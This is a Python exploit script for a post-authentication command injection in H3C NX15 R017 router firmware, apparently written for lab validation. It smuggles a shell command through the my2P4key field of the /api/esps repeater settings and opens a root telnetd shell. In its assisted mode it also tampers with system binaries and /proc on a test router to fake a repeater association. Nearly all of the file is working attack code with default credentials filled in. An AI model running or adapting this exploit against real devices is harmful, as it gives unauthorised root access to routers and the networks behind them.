#!/usr/bin/env python3
"""H3C NX15 R017 post-auth conditional root RCE via esps.wan.repeater -> repeaterproc.

Default mode uses the existing lab helper root shell on 2330 to emulate a successful
2.4G repeater association on a single-router bench, then triggers the raw HTTP request
that lands in repeaterproc's my2P4key -> changepasswd(newPass="%s") -> mw_system sink.

If you have a real upstream AP test setup, run with --no-assist and ensure the router
can actually associate to the attacker-controlled upstream AP described by the payload.
"""

import argparse
import json
import socket
import sys
import time
from typing import Dict

import requests

IAC = 255
DONT = 254
DO = 253
WONT = 252
WILL = 251


def log(msg: str) -> None:
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip('/') + '/api/login/auth',
        json={'username': username, 'password': password},
        timeout=10,
    )
    r.raise_for_status()
    body = r.json()
    if body.get('code') != 0:
        raise RuntimeError(f'login failed: {body}')
    return body['data']['session']


def wait_port(host: str, port: int, timeout: int = 45) -> bool:
    end = time.time() + timeout
    while time.time() < end:
        s = socket.socket()
        s.settimeout(2)
        try:
            s.connect((host, port))
            return True
        except Exception:
            time.sleep(1)
        finally:
            try:
                s.close()
            except Exception:
                pass
    return False


class TelnetLike:
    def __init__(self, host: str, port: int, timeout: float = 5.0):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(1)

    def _recv_clean_once(self) -> str:
        data = self.sock.recv(4096)
        i = 0
        clean = b''
        while i < len(data):
            if data[i] == IAC and i + 2 < len(data):
                cmd, opt = data[i + 1], data[i + 2]
                if cmd == DO:
                    self.sock.sendall(bytes([IAC, WONT, opt]))
                elif cmd == WILL:
                    self.sock.sendall(bytes([IAC, DONT, opt]))
                i += 3
            else:
                clean += bytes([data[i]])
                i += 1
        return clean.decode('latin1', 'ignore')

    def recv_text(self, timeout: float = 1.0) -> str:
        end = time.time() + timeout
        buf = ''
        while time.time() < end:
            try:
                chunk = self._recv_clean_once()
                if chunk:
                    buf += chunk
            except socket.timeout:
                pass
            except Exception:
                break
        return buf

    def run(self, cmd: str, timeout: float = 15.0, marker: str = '__END__') -> str:
        self.sock.sendall((cmd + f'\necho {marker}\n').encode())
        out = ''
        end = time.time() + timeout
        while time.time() < end:
            out += self.recv_text(1.0)
            if marker in out:
                break
        return out

    def close(self) -> None:
        try:
            self.sock.close()
        except Exception:
            pass


def query_state(helper: TelnetLike) -> Dict[str, str]:
    cmd = '''
for k in \
  wireless.2gssid1.ssid \
  wireless.2gssid1.key \
  wireless.2gssid1.encryption \
  wireless.2gssid6.disabled \
  system.bridge.repeater_enable \
  system.bridge.realmode \
  system.bridge.oldmode
 do
  v=$(uci -q get "$k" 2>/dev/null || true)
  echo "$k=$v"
 done
'''
    out = helper.run(cmd, timeout=8)
    state: Dict[str, str] = {}
    for line in out.splitlines():
        if '=' in line and line.split('=', 1)[0].count('.') >= 1:
            k, v = line.split('=', 1)
            state[k.strip()] = v.strip()
    return state


def assist_prepare(helper: TelnetLike, shell_port: int, marker_path: str) -> None:
    cmd = f'''[ -f /bin/iwconfig.repeaterproc_bak ] || cp /bin/iwconfig /bin/iwconfig.repeaterproc_bak
cat >/bin/iwconfig <<'SH'
#!/bin/sh
if [ "$1" = "wlan1-vxd" ]; then
  echo 'wlan1-vxd  IEEE 802.11-DS  ESSID:"same-ssid"'
  echo '          Mode:Managed  Frequency:2.437 GHz  Access Point: AA:BB:CC:DD:EE:FF   '
  echo '          Bit Rate:108 Mb/s   '
  exit 0
fi
exec /bin/iwconfig.repeaterproc_bak "$@"
SH
chmod +x /bin/iwconfig
mkdir -p /tmp/repeaterproc_rce
printf 'rssi: 10\ncurrent_tx_rate: 54 M\nonline_time: 10\n' > /tmp/repeaterproc_rce/sta_info
umount /proc/wlan1-vxd/sta_info 2>/dev/null || true
mount --bind /tmp/repeaterproc_rce/sta_info /proc/wlan1-vxd/sta_info
echo 1 >/tmp/config/connected
killall -9 repeaterproc 2>/dev/null || true
pid=$(ps w | awk '/telnetd -p{shell_port}/ && !/awk/ {{print $1}}')
[ -n "$pid" ] && kill "$pid" || true
rm -f {marker_path}
uci set wireless.2gssid6.disabled='1'
uci set system.bridge.repeater_enable='0'
uci set system.bridge.realmode='dhcp'
uci set system.bridge.oldmode='dhcp'
uci commit wireless
uci commit system
'''
    out = helper.run(cmd, timeout=12)
    log('[*] helper prepare output:')
    print(out)


def assist_cleanup(helper: TelnetLike, shell_port: int, marker_path: str, state: Dict[str, str]) -> None:
    restore = {
        'wireless.2gssid1.ssid': state.get('wireless.2gssid1.ssid', 'H3C_B4D5B0'),
        'wireless.2gssid1.key': state.get('wireless.2gssid1.key', 'admin123'),
        'wireless.2gssid1.encryption': state.get('wireless.2gssid1.encryption', 'psk2+ccmp'),
        'wireless.2gssid6.disabled': state.get('wireless.2gssid6.disabled', '1'),
        'system.bridge.repeater_enable': state.get('system.bridge.repeater_enable', '0'),
        'system.bridge.realmode': state.get('system.bridge.realmode', 'dhcp'),
        'system.bridge.oldmode': state.get('system.bridge.oldmode', 'dhcp'),
    }
    cmd = f'''pid=$(ps w | awk '/telnetd -p{shell_port}/ && !/awk/ {{print $1}}')
[ -n "$pid" ] && kill "$pid" || true
/etc/init.d/repeaterproc stop >/dev/null 2>&1 || true
killall -9 repeaterproc 2>/dev/null || true
umount /proc/wlan1-vxd/sta_info 2>/dev/null || true
if [ -f /bin/iwconfig.repeaterproc_bak ]; then cp /bin/iwconfig.repeaterproc_bak /bin/iwconfig; rm -f /bin/iwconfig.repeaterproc_bak; fi
chmod +x /bin/iwconfig 2>/dev/null || true
rm -rf /tmp/repeaterproc_rce /tmp/config/connected {marker_path}
uci set wireless.2gssid1.ssid='{restore['wireless.2gssid1.ssid']}'
uci set wireless.2gssid1.key='{restore['wireless.2gssid1.key']}'
uci set wireless.2gssid1.encryption='{restore['wireless.2gssid1.encryption']}'
uci set wireless.2gssid6.disabled='{restore['wireless.2gssid6.disabled']}'
uci set system.bridge.repeater_enable='{restore['system.bridge.repeater_enable']}'
uci set system.bridge.realmode='{restore['system.bridge.realmode']}'
uci set system.bridge.oldmode='{restore['system.bridge.oldmode']}'
uci commit wireless
uci commit system
ubus call reload reload_config '{{"config":"wireless","method":"reload","status":0}}' >/dev/null 2>&1 || true
ubus call reload reload_config '{{"config":"network","method":"reload","status":0}}' >/dev/null 2>&1 || true
sleep 3
uci show wireless.2gssid1
uci show wireless.2gssid6
uci show system.bridge
'''
    out = helper.run(cmd, timeout=20)
    log('[*] helper cleanup output:')
    print(out)


def build_raw_body(
    command: str,
    perior_ssid: str,
    perior_key: str,
    perior_radio: str,
    perior_encrypt: str,
    my2p4_ssid: str,
    my5g_ssid: str,
    my5g_key: str,
    intf: str,
    ip: str,
    submask: str,
    gwip: str,
) -> str:
    cmd_json = json.dumps(command)[1:-1]
    injected = f'x\\u0027;{cmd_json};#'
    parts = [
        '[{',
        '"id":1,',
        '"object":"esps.wan.repeater",',
        '"method":"set",',
        '"param":{"list":[{',
        f'"intf":{json.dumps(intf)},',
        '"workMode":"repeater",',
        f'"periorssid":{json.dumps(perior_ssid)},',
        f'"periorkey":{json.dumps(perior_key)},',
        f'"periorradio":{json.dumps(perior_radio)},',
        f'"periorencrypt":{json.dumps(perior_encrypt)},',
        f'"my2P4ssid":{json.dumps(my2p4_ssid)},',
        f'"my2P4key":"{injected}",',
        f'"my5Gssid":{json.dumps(my5g_ssid)},',
        f'"my5Gkey":{json.dumps(my5g_key)},',
        '"status":"enable",',
        f'"ip":{json.dumps(ip)},',
        f'"submask":{json.dumps(submask)},',
        f'"gwIp":{json.dumps(gwip)}',
        '}]}}]'
    ]
    return ''.join(parts)


def trigger(base: str, session: str, raw_body: str) -> str:
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    r = requests.post(base.rstrip('/') + '/api/esps', data=raw_body.encode(), headers=headers, timeout=20)
    r.raise_for_status()
    return r.text


def main() -> int:
    ap = argparse.ArgumentParser(description='H3C NX15 R017 conditional root RCE via esps.wan.repeater -> repeaterproc')
    ap.add_argument('--base', default='http://192.168.8.1')
    ap.add_argument('--host', default='192.168.8.1')
    ap.add_argument('--username', default='admin')
    ap.add_argument('--password', default='admin123')
    ap.add_argument('--intf', default='WAN1')
    ap.add_argument('--perior-ssid', default='same-ssid')
    ap.add_argument('--perior-key', default='upstreampass')
    ap.add_argument('--perior-radio', default='2.4G')
    ap.add_argument('--perior-encrypt', default='psk2+ccmp')
    ap.add_argument('--my2p4-ssid', default='same-ssid', help='keep equal to perior-ssid to skip key whitelist checks')
    ap.add_argument('--my5g-ssid', default='dummy5g')
    ap.add_argument('--my5g-key', default='DummyPass9!')
    ap.add_argument('--ip', default='192.168.8.2')
    ap.add_argument('--submask', default='255.255.255.0')
    ap.add_argument('--gwip', default='192.168.8.1')
    ap.add_argument('--shell-port', type=int, default=2461)
    ap.add_argument('--helper-port', type=int, default=2330, help='lab helper root shell port used for runtime-state emulation')
    ap.add_argument('--marker-path', default='/tmp/repeaterproc_rce_marker')
    ap.add_argument('--wait', type=int, default=45)
    ap.add_argument('--cmd', default=None, help='command to execute after shell breakout; keep it short enough to fit the 63-byte my2P4key limit')
    ap.add_argument('--no-assist', action='store_true', help='do not use the existing helper shell to emulate repeater association state')
    ap.add_argument('--cleanup', action='store_true', help='restore iwconfig/proc bind/uci state via helper shell after validation')
    args = ap.parse_args()

    # my2P4key is copied with a 63-byte cap in repeaterproc, so the default payload
    # must stay short. Use --cmd for custom payloads, but keep the effective shell
    # fragment compact enough to survive the strncpy(63) boundary.
    command = args.cmd or f'telnetd -p{args.shell_port} -l /bin/sh >/tmp/rp 2>&1'

    helper = None
    orig_state: Dict[str, str] = {}
    try:
        if not args.no_assist:
            log(f'[*] connect helper root shell {args.host}:{args.helper_port}')
            helper = TelnetLike(args.host, args.helper_port)
            helper.recv_text(1.5)
            orig_state = query_state(helper)
            log(f'[*] captured original state: {orig_state}')
            assist_prepare(helper, args.shell_port, args.marker_path)

        log('[*] web login')
        session = login(args.base, args.username, args.password)
        log(f'[*] session = {session}')

        raw_body = build_raw_body(
            command=command,
            perior_ssid=args.perior_ssid,
            perior_key=args.perior_key,
            perior_radio=args.perior_radio,
            perior_encrypt=args.perior_encrypt,
            my2p4_ssid=args.my2p4_ssid,
            my5g_ssid=args.my5g_ssid,
            my5g_key=args.my5g_key,
            intf=args.intf,
            ip=args.ip,
            submask=args.submask,
            gwip=args.gwip,
        )
        log('[*] trigger raw /api/esps body')
        print(raw_body)
        resp = trigger(args.base, session, raw_body)
        log(f'[*] response = {resp}')

        log(f'[*] wait for shell port {args.shell_port}')
        if not wait_port(args.host, args.shell_port, args.wait):
            raise RuntimeError(f'shell port {args.shell_port} did not open within {args.wait}s')

        shell = TelnetLike(args.host, args.shell_port)
        banner = shell.recv_text(1.5)
        proof = shell.run(f'id; uname -a; [ -f {args.marker_path} ] && cat {args.marker_path}; [ -f /tmp/rp ] && ls -l /tmp/rp', timeout=8)
        shell.close()

        print('=== spawned shell banner ===')
        print(banner)
        print('=== spawned shell proof ===')
        print(proof)

        ok = 'uid=0(root)' in proof
        if ok:
            log('[+] SUCCESS: obtained root RCE via esps.wan.repeater -> repeaterproc')
            return 0
        raise RuntimeError('spawned port answered but root proof string was missing')
    finally:
        if helper and args.cleanup:
            assist_cleanup(helper, args.shell_port, args.marker_path, orig_state)
        if helper:
            helper.close()


if __name__ == '__main__':
    sys.exit(main())
